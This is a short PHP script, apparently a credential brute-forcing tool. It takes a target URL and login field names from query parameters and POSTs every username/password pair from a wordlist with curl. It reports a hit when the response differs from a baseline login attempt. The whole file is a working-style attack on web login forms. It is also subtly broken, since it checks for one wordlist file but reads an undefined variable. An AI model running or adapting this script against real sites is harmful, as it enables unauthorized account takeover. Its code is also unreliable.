<?php

$url = $_GET['url'];
$username_field = $_GET['input1'];  
$password_field = $_GET['input2'];  


$playloads_file = 'playloads.txt';
if (!file_exists($playloads_file)) {
    die("Playloads file not found.");
}


$data = file($passwords_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$initial_response = send_form("hello", "hello", $url, $username_field, $password_field);


$found = false;

foreach ($data as $username) {
    foreach ($data as $password) {
        $response = send_form($username, $password, $url, $username_field, $password_field);
        if ($response !== $initial_response) {
            echo "<span style='color: green;'>Found correct username and password: $username and $password</span><br>";
            $found = true;
            break 2; // Exit both loops
        }
    }
}


if (!$found) {
    echo "<span style='color: red;'>No valid username and password found.</span>";
}

function send_form($username, $password, $url, $username_field, $password_field) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);

    
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(array($username_field => $username, $password_field => $password)));
    
    $response = curl_exec($ch);
    
    if ($response === false) {
        // Handle CURL error here
        echo 'Curl error: ' . curl_error($ch);
    }

    curl_close($ch);
    return $response;
}

?>
